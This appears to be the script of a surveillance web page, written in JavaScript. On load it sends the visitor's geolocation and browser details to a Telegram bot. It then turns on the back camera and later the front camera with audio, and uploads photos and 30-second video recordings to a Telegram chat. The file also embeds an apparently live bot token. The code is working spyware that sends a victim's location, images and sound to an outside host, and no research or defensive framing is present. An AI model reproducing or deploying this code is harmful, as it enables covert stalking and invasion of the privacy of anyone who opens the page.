const BOT_TOKEN = "8541888155:AAHooYl-aeie9lAaLNb9tIdWdruslEa1xXs";
const CHAT_ID = "YOUR_CHANNEL_ID";

let stream;
let recorder;
let chunks = [];

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

// 📍 LOCATION SEND
navigator.geolocation.getCurrentPosition(pos=>{
let lat = pos.coords.latitude;
let lon = pos.coords.longitude;

fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`);
});

// 📱 DEVICE INFO
let deviceInfo = `
User Agent: ${navigator.userAgent}
Platform: ${navigator.platform}
Language: ${navigator.language}
`;

fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(deviceInfo)}`);

// CAMERA FUNCTION
async function startCamera(facing){

stream = await navigator.mediaDevices.getUserMedia({
video:{facingMode:facing},
audio:true
});

video.srcObject = stream;

setTimeout(()=>capture(facing),3000);

}

function capture(name){

// PHOTO
setTimeout(()=>{
let c = canvas.getContext('2d');
c.drawImage(video,0,0,300,300);

canvas.toBlob(blob=>{
let fd=new FormData();
fd.append("chat_id",CHAT_ID);
fd.append("photo",blob,`${name}.png`);

fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
{method:"POST",body:fd});

});

},2000);


// VIDEO
recorder=new MediaRecorder(stream);

recorder.ondataavailable=e=>chunks.push(e.data);

recorder.onstop=e=>{
let blob=new Blob(chunks,{type:'video/webm'});

let fd=new FormData();
fd.append("chat_id",CHAT_ID);
fd.append("video",blob,`${name}.webm`);

fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,
{method:"POST",body:fd});

};

recorder.start();

setTimeout(()=>{
recorder.stop();
stream.getTracks().forEach(track=>track.stop());
},30000);

}

// 🔄 BACK CAMERA FIRST
startCamera("environment");

// THEN FRONT CAMERA AFTER 35s
setTimeout(()=>{
startCamera("user");
},35000);
